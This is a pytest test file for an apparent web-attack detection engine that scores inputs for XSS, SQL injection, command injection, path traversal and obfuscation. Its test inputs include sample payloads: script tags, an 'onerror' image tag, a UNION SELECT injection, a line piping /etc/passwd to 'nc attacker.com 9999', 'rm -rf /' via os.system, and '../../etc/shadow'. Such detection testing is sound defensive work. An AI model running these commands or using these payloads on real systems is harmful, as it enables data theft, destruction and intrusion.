import concurrent.futures
import random
import string
from unittest.mock import MagicMock, patch

from guard_core.detection_engine.semantic import SemanticAnalyzer


def test_initialization() -> None:
    analyzer = SemanticAnalyzer()

    assert "xss" in analyzer.attack_keywords
    assert "sql" in analyzer.attack_keywords
    assert "command" in analyzer.attack_keywords
    assert "path" in analyzer.attack_keywords
    assert "template" in analyzer.attack_keywords

    assert "script" in analyzer.attack_keywords["xss"]
    assert "select" in analyzer.attack_keywords["sql"]
    assert "exec" in analyzer.attack_keywords["command"]

    assert "brackets" in analyzer.suspicious_chars
    assert "quotes" in analyzer.suspicious_chars

    assert "tag_like" in analyzer.attack_structures
    assert "function_call" in analyzer.attack_structures


def test_extract_tokens_max_content_length() -> None:
    analyzer = SemanticAnalyzer()

    long_content = "a" * 60000

    tokens = analyzer.extract_tokens(long_content)

    assert len(tokens) <= 1000


def test_extract_tokens_timeout() -> None:
    analyzer = SemanticAnalyzer()

    with patch("concurrent.futures.ThreadPoolExecutor") as mock_executor:
        mock_future = MagicMock()
        mock_future.result.side_effect = concurrent.futures.TimeoutError()
        mock_submit = mock_executor.return_value.__enter__.return_value.submit
        mock_submit.return_value = mock_future

        content = "<script>alert(1)</script>"
        tokens = analyzer.extract_tokens(content)

        assert isinstance(tokens, list)


def test_calculate_entropy_empty_content() -> None:
    analyzer = SemanticAnalyzer()

    entropy = analyzer.calculate_entropy("")
    assert entropy == 0.0


def test_calculate_entropy_max_length() -> None:
    analyzer = SemanticAnalyzer()

    long_content = "abcdefghij" * 2000

    entropy = analyzer.calculate_entropy(long_content)

    assert entropy > 0.0


def test_detect_encoding_layers_url_encoding() -> None:
    analyzer = SemanticAnalyzer()

    content = "normal text %3Cscript%3E%20alert%281%29%3C%2Fscript%3E"
    layers = analyzer.detect_encoding_layers(content)

    assert layers >= 1


def test_detect_encoding_layers_html_entities() -> None:
    analyzer = SemanticAnalyzer()

    content = "normal text &lt;script&gt;alert(1)&lt;/script&gt;"
    layers = analyzer.detect_encoding_layers(content)

    assert layers >= 1


def test_detect_encoding_layers_multiple() -> None:
    analyzer = SemanticAnalyzer()

    content = "%3C &lt; \\u003C 0x3C3C AAAA=="
    layers = analyzer.detect_encoding_layers(content)

    assert layers >= 3


def test_analyze_attack_probability_empty_keywords() -> None:
    analyzer = SemanticAnalyzer()

    analyzer.attack_keywords["empty_test"] = set()

    content = "test content"
    probabilities = analyzer.analyze_attack_probability(content)

    assert "empty_test" in probabilities
    assert probabilities["empty_test"] == 0.0

    del analyzer.attack_keywords["empty_test"]


def test_analyze_attack_probability_command_pattern() -> None:
    analyzer = SemanticAnalyzer()

    content = "exec command; cat /etc/passwd | grep root"
    probabilities = analyzer.analyze_attack_probability(content)

    assert probabilities["command"] > 0.3


def test_analyze_attack_probability_path_pattern() -> None:
    analyzer = SemanticAnalyzer()

    content = "../../etc/passwd"
    probabilities = analyzer.analyze_attack_probability(content)

    assert probabilities["path"] > 0.3


def test_detect_obfuscation_high_entropy() -> None:
    analyzer = SemanticAnalyzer()

    random.seed(42)
    high_entropy_content = "".join(
        random.choice(string.ascii_letters + string.digits + string.punctuation)
        for _ in range(100)
    )

    is_obfuscated = analyzer.detect_obfuscation(high_entropy_content)

    assert is_obfuscated is True


def test_detect_obfuscation_special_chars() -> None:
    analyzer = SemanticAnalyzer()

    content = "!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`" * 3 + "normal"

    is_obfuscated = analyzer.detect_obfuscation(content)

    assert is_obfuscated is True


def test_analyze_code_injection_risk_brackets() -> None:
    analyzer = SemanticAnalyzer()

    content = "{malicious} code {injection}"
    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.2


def test_analyze_code_injection_risk_injection_keywords() -> None:
    analyzer = SemanticAnalyzer()

    content = "eval(user_input) and exec(command)"
    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.4


def test_extract_suspicious_patterns() -> None:
    analyzer = SemanticAnalyzer()

    content = "normal <script>alert(1)</script> text with function() call"
    patterns = analyzer.extract_suspicious_patterns(content)

    assert len(patterns) > 0

    for pattern in patterns:
        assert "type" in pattern
        assert "pattern" in pattern
        assert "position" in pattern
        assert "context" in pattern


def test_analyze_comprehensive() -> None:
    analyzer = SemanticAnalyzer()

    content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users"

    analysis = analyzer.analyze(content)

    assert "attack_probabilities" in analysis
    assert "entropy" in analysis
    assert "encoding_layers" in analysis
    assert "is_obfuscated" in analysis
    assert "suspicious_patterns" in analysis
    assert "code_injection_risk" in analysis
    assert "token_count" in analysis

    assert analysis["attack_probabilities"]["xss"] > 0
    assert analysis["attack_probabilities"]["sql"] > 0


def test_get_threat_score() -> None:
    analyzer = SemanticAnalyzer()

    analysis_results = {
        "attack_probabilities": {"xss": 0.8, "sql": 0.6},
        "is_obfuscated": True,
        "encoding_layers": 2,
        "code_injection_risk": 0.5,
        "suspicious_patterns": [{"type": "tag_like"}, {"type": "function_call"}],
    }

    score = analyzer.get_threat_score(analysis_results)

    assert 0.0 <= score <= 1.0
    assert score > 0.5


def test_get_threat_score_minimal() -> None:
    analyzer = SemanticAnalyzer()

    analysis_results = {
        "attack_probabilities": {},
        "is_obfuscated": False,
        "encoding_layers": 0,
        "code_injection_risk": 0.0,
        "suspicious_patterns": [],
    }

    score = analyzer.get_threat_score(analysis_results)

    assert score == 0.0


def test_integration_xss_detection() -> None:
    analyzer = SemanticAnalyzer()

    xss_content = "<img src=x onerror=alert(1)>"
    analysis = analyzer.analyze(xss_content)
    threat_score = analyzer.get_threat_score(analysis)

    assert analysis["attack_probabilities"]["xss"] > 0.3
    assert threat_score > 0.3


def test_integration_sql_injection_detection() -> None:
    analyzer = SemanticAnalyzer()

    sqli_content = "1' OR '1'='1' UNION SELECT * FROM users--"
    analysis = analyzer.analyze(sqli_content)
    threat_score = analyzer.get_threat_score(analysis)

    assert analysis["attack_probabilities"]["sql"] > 0.3
    assert threat_score > 0.2


def test_integration_command_injection_detection() -> None:
    analyzer = SemanticAnalyzer()

    cmd_content = "test; cat /etc/passwd | nc attacker.com 9999"
    analysis = analyzer.analyze(cmd_content)

    assert analysis["attack_probabilities"]["command"] > 0.3
    assert len(analysis["suspicious_patterns"]) > 0


def test_edge_case_unicode_content() -> None:
    analyzer = SemanticAnalyzer()

    unicode_content = "测试 <script>alert('χαίρετε')</script> اختبار"
    analysis = analyzer.analyze(unicode_content)

    assert analysis["attack_probabilities"]["xss"] > 0


def test_edge_case_mixed_case_keywords() -> None:
    analyzer = SemanticAnalyzer()

    mixed_case = "SeLeCt * FrOm UsErS UnIoN sElEcT"
    analysis = analyzer.analyze(mixed_case)

    assert analysis["attack_probabilities"]["sql"] > 0


def test_performance_large_input() -> None:
    analyzer = SemanticAnalyzer()

    large_content = "normal text " * 10000 + "<script>alert(1)</script>"

    import time

    start = time.time()
    analysis = analyzer.analyze(large_content)
    duration = time.time() - start

    assert duration < 1.0
    assert analysis["token_count"] <= 1000


def test_analyze_code_injection_risk_python_ast() -> None:
    analyzer = SemanticAnalyzer()
    content = "import os; os.system('rm -rf /')"
    risk = analyzer.analyze_code_injection_risk(content)
    assert risk >= 0.0


def test_detect_obfuscation_long_string() -> None:
    analyzer = SemanticAnalyzer()
    content = "A" * 200
    result = analyzer.detect_obfuscation(content)
    assert result is True


def test_detect_obfuscation_normal() -> None:
    analyzer = SemanticAnalyzer()
    content = "This is normal text with spaces and words"
    result = analyzer.detect_obfuscation(content)
    assert result is False


def test_get_structural_pattern_boost_template() -> None:
    analyzer = SemanticAnalyzer()
    boost = analyzer._get_structural_pattern_boost("template", "{{config}}")
    assert boost == 0.0


def test_calculate_base_score_empty() -> None:
    analyzer = SemanticAnalyzer()
    score = analyzer._calculate_base_score(set(), {"a", "b"})
    assert score == 0.0


def test_extract_tokens_empty() -> None:
    analyzer = SemanticAnalyzer()
    tokens = analyzer.extract_tokens("")
    assert tokens == []


def test_extract_tokens_many_special_patterns() -> None:
    analyzer = SemanticAnalyzer()
    xss_chunk = "<script>alert(1)</script>"
    sql_chunk = "UNION SELECT * FROM users WHERE id=1; DROP TABLE--"
    cmd_chunk = "; cat /etc/passwd | grep root &"
    path_chunk = "../../etc/shadow"
    content = (xss_chunk + sql_chunk + cmd_chunk + path_chunk) * 50
    tokens = analyzer.extract_tokens(content)
    assert isinstance(tokens, list)


def test_detect_obfuscation_encoding_layers() -> None:
    analyzer = SemanticAnalyzer()
    content = "abc %41%42 QUFB 0x4142 \\u0041 &amp;" + "aaaa" * 50
    result = analyzer.detect_obfuscation(content)
    assert result is True


def test_detect_obfuscation_high_special_char_ratio() -> None:
    analyzer = SemanticAnalyzer()
    content = "!@#$" * 10 + "abcd" * 3
    assert analyzer.calculate_entropy(content) <= 4.5
    assert analyzer.detect_encoding_layers(content) <= 2
    result = analyzer.detect_obfuscation(content)
    assert result is True


def test_detect_obfuscation_continuous_chars() -> None:
    analyzer = SemanticAnalyzer()
    content = "a" * 200
    result = analyzer.detect_obfuscation(content)
    assert result is True


def test_check_code_pattern_risks_variable() -> None:
    analyzer = SemanticAnalyzer()
    risk = analyzer._check_code_pattern_risks("$var @attr")
    assert risk >= 0.1


def test_check_ast_parsing_risk_syntax_error() -> None:
    analyzer = SemanticAnalyzer()
    risk = analyzer._check_ast_parsing_risk("not valid python {{{")
    assert risk == 0.0


def test_check_ast_parsing_risk_valid_expression() -> None:
    analyzer = SemanticAnalyzer()
    risk = analyzer._check_ast_parsing_risk("1 + 2")
    assert risk == 0.3


def test_check_ast_parsing_risk_timeout() -> None:
    import concurrent.futures
    from unittest.mock import MagicMock, patch

    analyzer = SemanticAnalyzer()
    with patch("concurrent.futures.ThreadPoolExecutor") as mock_executor:
        mock_future = MagicMock()
        mock_future.result.side_effect = concurrent.futures.TimeoutError()
        mock_executor.return_value.__enter__ = MagicMock(
            return_value=MagicMock(submit=MagicMock(return_value=mock_future))
        )
        mock_executor.return_value.__exit__ = MagicMock(return_value=False)
        risk = analyzer._check_ast_parsing_risk("1 + 2")
    assert risk == 0.2


def test_tokenize_special_patterns_limit():
    analyzer = SemanticAnalyzer()
    many_matches = ["match"] * 60
    with patch.object(
        concurrent.futures.ThreadPoolExecutor,
        "submit",
        return_value=MagicMock(result=MagicMock(return_value=many_matches)),
    ):
        tokens = analyzer.extract_tokens("content with patterns")
    assert len(tokens) <= 100


def test_ast_parsing_risk_valid_expression():
    analyzer = SemanticAnalyzer()
    result = analyzer._check_ast_parsing_risk("1 + 2")
    assert result >= 0.0


def test_ast_parsing_risk_generic_exception():
    analyzer = SemanticAnalyzer()
    with patch("ast.parse", side_effect=MemoryError("oom")):
        result = analyzer._check_ast_parsing_risk("1 + 2")
    assert result == 0.0
